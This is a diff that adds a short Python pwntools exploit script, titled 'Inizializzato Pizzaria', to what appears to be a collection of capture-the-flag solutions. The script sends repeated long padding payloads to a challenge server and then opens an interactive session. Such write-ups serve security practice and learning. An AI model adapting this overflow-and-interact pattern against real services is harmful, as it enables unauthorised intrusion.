@@ -49,6 +49,43 @@ if __name__ == "__main__":
 		print("[!] Error running exploit! [!]")
 ```
 
+## Inizializzato Pizzaria
+```py
+from pwn import *
+
+
+# Inizializzato Pizzaria
+# Date: 08/22/21
+# Author: 0x1CA3
+
+
+class Pwn():
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+
+    def exploit(self):
+        payload = b'444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444'
+        connection = remote(self.host, self.port)
+        connection.sendline(b'3')
+        
+        connection.sendline(payload)
+        connection.sendline(payload)
+        connection.sendline(payload)
+        connection.sendline(payload)
+        
+        connection.sendline(b'4')
+        connection.interactive()
+
+def main():
+    host = "challenges.0x0539.net"
+    port = 3001
+    Pwn(host, port).exploit()
+
+if __name__ == "__main__":
+    main()
+```
+
 ## Lucky Feeling
 ```py
 import requests
